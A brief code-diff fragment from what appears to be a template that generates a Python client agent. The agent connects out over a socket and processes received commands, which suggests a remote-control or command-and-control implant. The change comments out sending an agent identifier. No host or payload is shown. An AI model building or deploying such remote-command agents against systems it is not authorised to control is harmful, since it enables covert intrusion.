@@ -158,7 +158,7 @@ def execute_other_commands(client_socket, msg_parts):
 if __name__ == "__main__":
     {val}
     cs = attempt_connection()
-    cs.send(agent_id.encode())
+    #cs.send(agent_id.encode())
     process_commands(cs)
 
 """
